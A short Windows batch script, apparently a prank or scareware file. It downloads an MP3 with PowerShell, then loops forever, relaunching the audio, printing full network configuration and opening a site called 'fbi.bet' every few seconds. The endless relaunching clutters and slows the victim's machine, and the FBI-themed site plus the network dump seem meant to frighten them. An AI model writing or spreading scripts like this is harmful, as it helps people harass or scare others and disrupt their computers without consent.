@echo off
setlocal enabledelayedexpansion

set "mp3_url=https://example.com/music.mp3"
set "mp3_file=music.mp3"

:: Download MP3 file
powershell -Command "Invoke-WebRequest -Uri '%mp3_url%' -OutFile '%mp3_file%'"

:: Play MP3 file on loop
:loop
start "" "%mp3_file%"
timeout /t 3 /nobreak >nul

:: Show network information
ipconfig /all
timeout /t 3 /nobreak >nul

:: Open website
start "" "https://fbi.bet"
timeout /t 3 /nobreak >nul

goto loop